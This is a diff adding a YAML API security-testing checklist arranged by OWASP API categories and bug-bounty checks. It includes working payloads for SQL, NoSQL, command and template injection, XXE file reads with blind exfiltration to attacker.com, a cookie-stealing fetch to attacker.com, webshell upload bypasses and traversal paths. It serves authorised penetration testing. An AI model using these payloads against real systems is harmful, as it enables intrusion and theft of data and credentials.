+        title: "Check for exposed debug, admin, and actuator endpoints"
+        content: |
+          Spring Boot Actuator: /actuator, /actuator/env, /actuator/heapdump,
+          /actuator/logfile, /actuator/mappings, /actuator/configprops
+          Django Debug: /?debug=true, debug toolbar, django-extensions
+          Express.js: /api-explorer, /api-console
+          Generic: /debug, /console, /phpinfo.php, /test, /dev, /trace, /profiler
+          Health checks with secrets: /health, /status, /ping (check response body)
+
+      - id: sm_verbose_errors
+        type: checklist
+        title: "Trigger verbose error messages and stack traces in production"
+        content: |
+          - Send type mismatches: string where int expected
+          - Missing required body fields
+          - Extremely long strings, binary data, null bytes
+          - Invalid enum values
+          - Malformed JSON: {unclosed, [array}, "string': value}
+          Production APIs must return generic error messages, not stack traces.
+
+      - id: sm_http_trace
+        type: checklist
+        title: "Test for enabled TRACE and TRACK methods (XST)"
+        content: |
+          TRACE / TRACK methods reflect the request body — can be used for XST attacks.
+          TRACE /api/endpoint HTTP/1.1
+          If response echoes the request, TRACE is enabled (disable at server level).
+
+      - id: sm_content_type_confusion
+        type: checklist
+        title: "Test content-type confusion"
+        content: |
+          - Change Content-Type: application/json to application/xml
+          - Change to text/plain, multipart/form-data, application/x-www-form-urlencoded
+          - Omit Content-Type header entirely
+          Some parsers accept unexpected formats and may behave differently.
+
+      - id: sm_http_request_smuggling
+        type: checklist
+        title: "Test for HTTP request smuggling (CL.TE, TE.CL)"
+        content: |
+          Relevant when API sits behind a reverse proxy or load balancer.
+          Tools: Burp Suite HTTP Request Smuggler extension, smuggler.py
+          Test CL.TE and TE.CL variants; look for delayed responses or 400 errors.
+
+  # ===========================================================================
+  # OWASP API9: IMPROPER INVENTORY MANAGEMENT
+  # ===========================================================================
+  - id: inventory
+    type: info
+    title: "API9: Improper Inventory Management"
+    content: |
+      Old, undocumented, or shadow API versions often lack controls added to current versions.
+    children:
+      - id: inv_version_comparison
+        type: checklist
+        title: "Map all API versions and compare security controls between them"
+        content: |
+          Access the same endpoint on v1, v2, v3 (and any legacy/beta versions).
+          Compare: rate limiting, authentication requirements, input validation,
+          response data (v1 may return more fields), authorization enforcement.
+
+      - id: inv_deprecated_endpoints
+        type: checklist
+        title: "Test deprecated endpoints still accessible in production"
+        content: |
+          Path prefixes to check: /v0/, /legacy/, /old/, /beta/, /test/, /dev/
+          Also try removing the version prefix entirely: /api/users vs /api/v2/users
+
+      - id: inv_staging_exposed
+        type: checklist
+        title: "Check for staging/dev environments accessible from production domains"
+        content: |
+          Subdomains: staging-api., dev-api., test., sandbox., qa., uat., internal-api.
+          Staging environments often have debug enabled, weaker auth, or real data copies.
+
+      - id: inv_shadow_api
+        type: checklist
+        title: "Identify shadow APIs not included in official documentation"
+        content: |
+          Found via: JS source extraction, mobile app decompile, traffic capture,
+          error messages mentioning unknown endpoints, GitHub history.
+          Shadow APIs are rarely security-reviewed.
+
+  # ===========================================================================
+  # OWASP API10: UNSAFE CONSUMPTION OF THIRD-PARTY APIS
+  # ===========================================================================
+  - id: third_party
+    type: info
+    title: "API10: Unsafe Consumption of APIs"
+    content: |
+      Test how the target API consumes and trusts external data sources.
+    children:
+      - id: tp_injection_via_third_party
+        type: checklist
+        title: "Test injection via data sourced from third-party APIs"
+        content: |
+          If the API consumes and stores/reflects data from external sources (e.g., pulls
+          user profile from a social login, imports data from partner API):
+          - Inject XSS payloads into third-party profile data
+          - Inject SQL/NoSQL operators into third-party-sourced fields
+          The application may not sanitize data it "trusts" from a third party.
+
+      - id: tp_tls_validation
+        type: checklist
+        title: "Verify outbound API calls to third parties enforce TLS certificate validation"
+        content: |
+          If the server makes outbound HTTP calls to partner APIs:
+          - Does it validate TLS certificates on those calls?
+          - SSRF + MitM: if you can SSRF to a third-party endpoint, can you intercept it?
+
+      - id: tp_redirect_abuse
+        type: checklist
+        title: "Test for open redirects in OAuth and webhook callback handling"
+        content: |
+          When processing OAuth callbacks or third-party webhooks:
+          - Manipulate redirect URLs to external destinations
+          - Test if the server follows redirects from third-party responses blindly
+
+      - id: tp_key_exposure
+        type: checklist
+        title: "Test for third-party API keys exposed in responses or headers"
+        content: |
+          Proxy all API traffic and search responses for:
+          - AWS access keys (AKIA...)
+          - Stripe/payment API keys (sk_live_...)
+          - SendGrid / Twilio / other service keys
+          - Google API keys, Firebase tokens
+
+  # ===========================================================================
+  # INJECTION VULNERABILITIES
+  # ===========================================================================
+  - id: injection
+    type: info
+    title: "Injection Vulnerabilities"
+    content: |
+      Test all input-accepting parameters for injection flaws.
+      Don't limit testing to obvious fields — try headers, cookies, JSON keys, and filenames.
+    children:
+      - id: inj_sqli
+        type: checklist
+        title: "Test for SQL injection in all query parameters and body fields"
+        content: |
+          Error-based: ' OR '1'='1, '; SELECT 1--, 1 AND 1=2
+          Time-based blind: ' OR SLEEP(5)--, '; WAITFOR DELAY '0:0:5'--
+          Boolean-based: 1 AND 1=1 (true) vs 1 AND 1=2 (false — different response)
+          Tools: sqlmap -u "https://target.com/api/users?id=1" --level=5 --risk=3
+          Manual test all: filter, search, sort, order, id, page parameters
+          Also test: JSON body fields, HTTP headers (User-Agent, Referer, Cookie)
+
+      - id: inj_nosql
+        type: checklist
+        title: "Test for NoSQL injection (MongoDB, Redis, CouchDB)"
+        content: |
+          MongoDB operator injection:
+          - Query param: ?username[$gt]=&password[$gt]=  (matches all records)
+          - JSON body: {"username": {"$gt": ""}, "password": {"$gt": ""}}
+          - {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+
+          MongoDB where injection:
+          {"$where": "sleep(5000)"}  → time-based blind
+
+          Tools: NoSQLMap, Burp Scanner
+
+      - id: inj_command
+        type: checklist
+        title: "Test for OS command injection"
+        content: |
+          Target parameters that may be passed to shell: filename, path, host,
+          domain, ip, port, username, search, format, template.
+          Linux: ;id, &&id, |id, $(id), `id`, %0Aid
+          Windows: &whoami, |whoami, &&dir
+          Blind (OOB): $(nslookup `whoami`.collaborator.com)
+          Tools: Burp Collaborator for blind detection
+
+      - id: inj_ssti
+        type: checklist
+        title: "Test for Server-Side Template Injection (SSTI)"
+        content: |
+          Detection payloads: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {7*7}, @(7*7)
+          Expected output: 49 → confirms SSTI
+
+          Escalation by engine:
+          - Jinja2: {{''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate()}}
+          - Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+          - Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+          Tools: tplmap
+
+      - id: inj_ldap
+        type: checklist
+        title: "Test for LDAP injection in authentication and directory-search endpoints"
+        content: |
+          If the API searches an LDAP directory: *)(uid=*))(|(uid=*
+          Authentication bypass: admin)(&(password=*)
+          Test any endpoint with user lookup, group membership, or directory search.
+
+  # ===========================================================================
+  # XML INPUT (CONDITIONAL)
+  # ===========================================================================
+  - id: xml_support
+    type: question
+    title: "Does the API accept XML input? (Content-Type: application/xml or text/xml)"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: xxe_section
+            type: info
+            title: "XXE (XML External Entity) Testing"
+            content: |
+              XXE is critical when present — can lead to arbitrary file read, SSRF, and RCE.
+            children:
+              - id: xxe_basic_file_read
+                type: checklist
+                title: "Test basic XXE for local file read"
+                content: |
+                  Add DOCTYPE before the root XML element:
+                  <?xml version="1.0"?>
+                  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+                  <root><field>&xxe;</field></root>
+
+                  Windows targets: file:///C:/Windows/System32/drivers/etc/hosts
+                  Also try: file:///etc/shadow, file:///proc/self/environ
+
+              - id: xxe_ssrf
+                type: checklist
+                title: "Test XXE for SSRF (access internal services via XML entity)"
+                content: |
+                  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+                  <root><field>&xxe;</field></root>
+                  Also target: http://localhost/, http://internal-service:8080/
+
+              - id: xxe_blind_oob
+                type: checklist
+                title: "Test blind XXE via out-of-band data exfiltration"
+                content: |
+                  When response does not reflect entity content:
+                  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/dtd.xml"> %xxe;]>
+
+                  attacker.com/dtd.xml:
+                  <!ENTITY % file SYSTEM "file:///etc/passwd">
+                  <!ENTITY % exfil "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+                  %exfil;
+                  %exfiltrate;
+
+              - id: xxe_xinclude
+                type: checklist
+                title: "Test XInclude injection when DOCTYPE is not controllable"
+                content: |
+                  If server embeds your input in an XML document (no DOCTYPE control):
+                  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+                  <xi:include href="file:///etc/passwd" parse="text"/></foo>
+
+      - label: "No"
+        key: "no"
+        children: []
+
+  # ===========================================================================
+  # GRAPHQL (CONDITIONAL)
+  # ===========================================================================
+  - id: graphql_check
+    type: question
+    title: "Does the API expose a GraphQL endpoint?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: graphql_section
+            type: info
+            title: "GraphQL Security Testing"
+            content: |
+              GraphQL introduces a unique attack surface beyond standard REST.
+              Common endpoints: /graphql, /api/graphql, /gql, /query
+            children:
+              - id: gql_introspection
+                type: checklist
+                title: "Enable introspection and map the full schema"
+                content: |
+                  Send introspection query:
+                  {"query": "{__schema{types{name,fields{name,type{name,kind,ofType{name}}}}}}"}
+
+                  If disabled, use field suggestion enumeration:
+                  - Send typo query: {usr{id}} → "Did you mean 'user'?"
+                  - Tool: Clairvoyance (https://github.com/nikitastupin/clairvoyance)
+                  - InQL Burp extension for schema visualization
+
+              - id: gql_batch_brute
+                type: checklist
+                title: "Test query and mutation batching for rate limit bypass"
+                content: |
+                  Array batching:
+                  [{"query":"mutation{login(user:\"admin\",pass:\"pass1\")}"},
+                   {"query":"mutation{login(user:\"admin\",pass:\"pass2\")}"},
+                   ... x100]
+
+                  Alias batching (alternative):
+                  {a1:login(user:"admin",pass:"p1") a2:login(user:"admin",pass:"p2") ...}
+
+                  Both bypass per-request rate limiting.
+
+              - id: gql_depth_dos
+                type: checklist
+                title: "Test query depth and complexity limits (DoS)"
+                content: |
+                  Deeply nested query:
+                  { user { friends { friends { friends { friends { friends { id } } } } } } }
+
+                  Also test: circular fragments, extremely wide queries (100+ fields).
+                  If no depth limit: can trigger recursive DB joins → server crash.
+
+              - id: gql_idor
+                type: checklist
+                title: "Test BOLA/IDOR in GraphQL query and mutation arguments"
+                content: |
+                  query { user(id: "other_user_id") { email, phone, address } }
+                  mutation { deletePost(id: "other_users_post_id") { success } }
+
+                  Every ID argument is an IDOR candidate — treat the same as REST BOLA.
+
+              - id: gql_injection
+                type: checklist
+                title: "Test injection in GraphQL variables and inline arguments"
+                content: |
+                  SQL injection via variable: {"query":"query($id:String!){user(id:$id){email}}","variables":{"id":"1' OR '1'='1"}}
+                  NoSQL: {"id": {"$gt": ""}}
+                  SSTI: {"query":"{user(name:\"{{7*7}}\"){id}}"}
+
+              - id: gql_info_disclosure
+                type: checklist
+                title: "Check for sensitive fields accessible via schema exploration"
+                content: |
+                  After mapping the schema, look for: passwords, tokens, secrets, PII fields
+                  that should not be queryable. Test if field-level authorization is enforced.
+
+              - id: gql_csrf
+                type: checklist
+                title: "Test GraphQL CSRF (GET-based queries, no CSRF token)"
+                content: |
+                  If GET requests are supported: GET /graphql?query={mutation{deleteUser}}
+                  If cookies used for auth and no CSRF protection, a simple HTML page can
+                  trigger mutations cross-origin using a <img src=...> or <form>.
+
+      - label: "No"
+        key: "no"
+        children: []
+
+  # ===========================================================================
+  # WEBSOCKETS (CONDITIONAL)
+  # ===========================================================================
+  - id: websocket_check
+    type: question
+    title: "Does the API use WebSockets?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: ws_section
+            type: info
+            title: "WebSocket Security Testing"
+            content: |
+              WebSocket connections are established via HTTP upgrade — test the handshake
+              AND all subsequent message-level security.
+              Tool: Burp Suite → Proxy → WebSockets history
+            children:
+              - id: ws_origin_validation
+                type: checklist
+                title: "Test WebSocket handshake origin validation"
+                content: |
+                  During the Upgrade request, modify the Origin header:
+                  - Origin: https://evil.com
+                  - Origin: null
+                  If the server accepts connections from arbitrary origins, cross-site
+                  WebSocket hijacking is possible.
+
+              - id: ws_auth
+                type: checklist
+                title: "Test for missing or bypassable authentication on WebSocket connections"
+                content: |
+                  - Connect without any auth token / session cookie
+                  - Use a token that belongs to another user
+                  - Use an expired token
+                  - Replay a token after logout
+
+              - id: ws_idor
+                type: checklist
+                title: "Test BOLA/IDOR in WebSocket message IDs and object references"
+                content: |
+                  Intercept WebSocket messages and substitute object IDs (user_id,
+                  room_id, channel_id) with other users' values.
+                  {"action": "get_messages", "room_id": "other_users_room"}
+
+              - id: ws_csrf_hijacking
+                type: checklist
+                title: "Test cross-site WebSocket hijacking (CSRF via WebSocket)"
+                content: |
+                  If the WebSocket handshake uses cookies (not custom auth headers)
+                  and Origin is not validated:
+                  Host a malicious HTML page that opens: new WebSocket('wss://target.com/ws')
+                  All cookie-authenticated WebSocket data becomes accessible cross-origin.
+
+              - id: ws_injection
+                type: checklist
+                title: "Test injection in WebSocket message parameters"
+                content: |
+                  Send XSS, SQLi, command injection payloads via WebSocket message fields.
+                  Messages may be processed server-side with less scrutiny than HTTP requests.
+
+      - label: "No"
+        key: "no"
+        children: []
+
+  # ===========================================================================
+  # FILE UPLOAD (CONDITIONAL)
+  # ===========================================================================
+  - id: file_upload_check
+    type: question
+    title: "Does the API support file uploads?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: upload_section
+            type: info
+            title: "File Upload Security Testing"
+            children:
+              - id: upload_type_bypass
+                type: checklist
+                title: "Test file type restriction bypass"
+                content: |
+                  Extension manipulation: file.php.jpg, file.pHp, file.php5, file.phtml,
+                  file.php%00.jpg (null byte), file.php;.jpg, file.php.
+                  MIME type bypass: set Content-Type: image/jpeg for a PHP webshell
+                  Double extension: file.jpg.php
+                  Null byte: file.php\x00.jpg
+
+              - id: upload_path_traversal
+                type: checklist
+                title: "Test path traversal in filename parameter"
+                content: |
+                  In the Content-Disposition filename:
+                  - ../../../var/www/html/shell.php
+                  - ../../.ssh/authorized_keys
+                  - URL-encoded: ..%2F..%2Fshell.php
+                  Goal: write files to unintended locations on the server.
+
+              - id: upload_svg_xss
+                type: checklist
+                title: "Test SVG and HTML upload for stored XSS"
+                content: |
+                  SVG payload: <svg xmlns="http://www.w3.org/2000/svg">
+                  <script>alert(document.cookie)</script></svg>
+                  If the SVG is served from the same origin, the script executes.
+                  Also try HTML files: <script>fetch('https://attacker.com?c='+document.cookie)</script>
+
+              - id: upload_zip_slip
+                type: checklist
+                title: "Test zip slip / archive path traversal extraction"
+                content: |
+                  Create a zip with entry named: ../../etc/cron.d/payload
+                  or ../../var/www/html/webshell.php
+                  If the server extracts without sanitizing filenames, arbitrary write.
+                  Tool: evilarc (https://github.com/ptoomey3/evilarc)
+
+              - id: upload_size_dos
+                type: checklist
+                title: "Test file size limit enforcement"
+                content: |
+                  - Upload a file exceeding stated limits
+                  - Upload a zip bomb (small compressed, huge decompressed)
+                  - Concurrent upload of many large files
+
+      - label: "No"
+        key: "no"
+        children: []
+
+  # ===========================================================================
+  # INFORMATION DISCLOSURE
+  # ===========================================================================
+  - id: info_disclosure
+    type: info
+    title: "Information Disclosure"
+    children:
+      - id: id_sensitive_in_responses
+        type: checklist
+        title: "Audit responses for tokens, keys, and credentials"
+        content: |
+          Proxy all API traffic and search responses for:
+          - AWS keys: AKIA[A-Z0-9]{16}
+          - Private keys: -----BEGIN RSA PRIVATE KEY-----
+          - JWT tokens in non-Authorization fields
+          - Database connection strings, passwords in config responses
+
+      - id: id_pii_exposure
+        type: checklist
+        title: "Audit for excessive PII in API responses"
+        content: |
+          Fields to look for: SSN, DOB, full credit card numbers, CVV, bank account,
+          passport/ID number, full home address in contexts where partial is sufficient.
+          Compare data returned vs. data actually rendered in the UI.
+
+      - id: id_server_banners
+        type: checklist
+        title: "Check for server version disclosure in response headers"
+        content: |
+          Headers: Server, X-Powered-By, X-AspNet-Version, X-AspNetMvc-Version,
+          X-Generator, X-Runtime
+          These reveal exact software versions useful for CVE targeting.
+
+      - id: id_internal_paths
+        type: checklist
+        title: "Check error messages for internal paths, hostnames, and DB info"
+        content: |
+          Trigger errors with bad input; look for:
+          - Absolute file paths (/home/app/src/...)
+          - DB table/column names in SQL errors
+          - Internal hostnames (db-01.internal, redis.prod)
+          - Private IP addresses in error bodies
+
+      - id: id_git_env
+        type: checklist
+        title: "Check for exposed .git, .env, and backup files on the API host"
+        content: |
+          Try: /.git/HEAD, /.git/config, /.env, /.env.production,
+          /api.tar.gz, /backup.sql, /config.json, /.DS_Store
+          Tools: GitDumper, dotdotpwn, feroxbuster with backup extension wordlist
+
+  # ===========================================================================
+  # ADDITIONAL HIGH-VALUE BUG BOUNTY CHECKS
+  # ===========================================================================
+  - id: bug_bounty_extras
+    type: info
+    title: "Additional Bug Bounty High-Value Checks"
+    content: |
+      Vulnerability classes that frequently appear in API-focused bug bounty reports
+      but don't fit neatly into OWASP categories.
+    children:
+      - id: bb_cache_poisoning
+        type: checklist
+        title: "Test API response cache poisoning via unkeyed headers"
+        content: |
+          Inject headers that alter the response but are not included in the cache key:
+          X-Forwarded-Host: evil.com
+          X-Forwarded-Scheme: http
+          X-Forwarded-Proto: http
+          X-Original-URL: /admin
+
+          If the poisoned response is cached and served to other users:
+          → reflected XSS, redirect to phishing, or content injection at scale.
+          Use cache buster (?cb=<random>) to avoid poisoning yourself.
+          Tool: Burp Suite Web Cache Poisoning extension, param-miner
+
+      - id: bb_http_param_pollution
+        type: checklist
+        title: "Test HTTP parameter pollution (duplicate parameter injection)"
+        content: |
+          Duplicate GET params: /api/transfer?amount=1000&to=victim&amount=1
+          Body + query string collision: body {amount: 1000} + ?amount=1
+          Array vs scalar: amount[]=1&amount[]=1000
+          Backend may take first, last, or both values — behavior is framework-dependent.
+
+      - id: bb_deserialization
+        type: checklist
+        title: "Test for insecure deserialization in binary and JSON object fields"
+        content: |
+          Look for serialized objects in:
+          - Cookies (base64-encoded, starts with rO0AB = Java, O: = PHP)
+          - Custom headers (X-Auth-Token, X-Session-Data)
+          - Request body fields
+
+          Java: ysoserial payloads (CommonsCollections, Spring, JRE8U20)
+          PHP: PHPGGC (gadget chains for Laravel, Symfony, Yii, ZendFramework)
+          Python pickle: os.system() via crafted pickle stream
+          .NET: ysoserial.net
+          Tools: Burp Deserialization Scanner, serialization-detector
+
+      - id: bb_prototype_pollution
+        type: checklist
+        title: "Test JavaScript prototype pollution in JSON request body"
+        content: |
+          Inject into JSON body:
+          {"__proto__": {"admin": true, "isVip": true}}
+          {"constructor": {"prototype": {"admin": true}}}
+
+          If the server merges user input into an object without sanitization
+          (Object.assign, _.merge, jQuery.extend), prototype chain is polluted.
+          Observe changes in subsequent requests (admin access, feature flags).
+
+      - id: bb_account_takeover_chains
+        type: checklist
+        title: "Test account takeover chains combining multiple lower-severity issues"
+        content: |
+          Common chains:
+          - Password reset token + IDOR → reset another user's password
+          - OAuth misconfiguration + open redirect → steal auth code
+          - Subdomain takeover + CORS wildcard → read authenticated responses
+          - Self-XSS + CSRF → upgrade to reflected/stored XSS
+          - BOLA + mass assignment → read then write another user's account
+
+      - id: bb_2fa_recovery
+        type: checklist
+        title: "Test 2FA recovery mechanisms and backup code security"
+        content: |
+          - Are backup codes truly one-time? Test reuse.
+          - Are backup codes predictable (sequential, short)?
+          - Is there a rate limit on backup code attempts?
+          - Can you bypass 2FA by going directly to the post-auth endpoint?
+          - Test recovery via support flow: social engineering vectors.
+
+      - id: bb_subdomain_takeover
+        type: checklist
+        title: "Check for subdomain takeover on API subdomains"
+        content: |
+          Dangling CNAME records pointing to unclaimed services:
+          - AWS S3 (s3.amazonaws.com), Elastic Beanstalk, CloudFront
+          - GitHub Pages, Heroku, Netlify, Vercel, Fastly, Zendesk
+          - Azure (azurewebsites.net, cloudapp.net)
+
+          Tools: subjack, nuclei -t takeovers/, can-i-take-over-xyz list
+          A taken-over subdomain can steal cookies, serve phishing, or break CORS.
+
+      - id: bb_api_key_in_client
+        type: checklist
+        title: "Extract and test API keys embedded in mobile apps and frontend code"
+        content: |
+          Decompile APK with jadx; search minified JS with grep/regex.
+          Embedded keys may:
+          - Grant excessive permissions (admin-scoped key in the client)
+          - Work across tenants (single key shared across customers)
+          - Never expire (rotated manually, old keys still valid)
+          Test found keys against all available endpoints for scope.
+
+      - id: bb_idempotency_abuse
+        type: checklist
+        title: "Test idempotency key bypass for duplicate transaction execution"
+        content: |
+          APIs using idempotency keys (Stripe pattern) to prevent duplicate charges:
+          - Submit same request with a new idempotency key each time
+          - Race condition: submit two requests simultaneously before either completes
+          - Test key namespace isolation: can you reuse another user's idempotency key?
